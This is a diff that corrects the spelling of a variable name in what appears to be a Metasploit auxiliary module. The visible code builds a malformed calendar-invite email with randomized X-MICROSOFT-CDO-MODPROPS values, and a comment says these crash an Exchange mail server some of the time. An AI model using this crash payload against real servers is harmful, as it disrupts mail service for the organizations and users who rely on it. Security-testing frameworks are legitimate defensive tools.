@@ -65,7 +65,7 @@ class MetasploitModule < Msf::Auxiliary
       modproplong << modprops[rand(modprops.size)] + ","
     }
 
-    boundry = Rex::Text.rand_text_alphanumeric(8) + "." + Rex::Text.rand_text_alphanumeric(8)
+    boundary = Rex::Text.rand_text_alphanumeric(8) + "." + Rex::Text.rand_text_alphanumeric(8)
 
 
     # Really, the randomization above only crashes /sometimes/ - it's MUCH more
@@ -80,10 +80,10 @@ class MetasploitModule < Msf::Auxiliary
     mail <<		"Subject: #{datastore['SUBJECT']}\r\n"
     mail <<		"Content-class: urn:content-classes:calendarmessage\r\n"
     mail <<		"MIME-Version: 1.0\r\n"
-    mail <<		"Content-Type: multipart/alternative;boundary=\"#{boundry}\"\r\n"
+    mail <<		"Content-Type: multipart/alternative;boundary=\"#{boundary}\"\r\n"
     mail <<		"X-MimeOLE: Produced By Microsoft Exchange V6.5.7226.0\r\n"
     mail <<     "\r\n"
-    mail << 	"--#{boundry}\r\n"
+    mail << 	"--#{boundary}\r\n"
     mail <<		"Content-class: urn:content-classes:calendarmessage\r\n"
     mail <<		"Content-Type: text/calendar; method=REQUEST; name=\"meeting.ics\"\r\n"
     mail <<		"Content-Transfer-Encoding: 8bit\r\n"
@@ -97,7 +97,7 @@ class MetasploitModule < Msf::Auxiliary
     mail <<		"X-MICROSOFT-CDO-MODPROPS:#{modproplong.chop}\r\n"
     mail <<		"END:VEVENT\r\n"
     mail <<		"END:VCALENDAR\r\n"
-    mail <<		"\r\n--#{boundry}\r\n"
+    mail <<		"\r\n--#{boundary}\r\n"
     mail <<		"\r\n.\r\n"
 
 
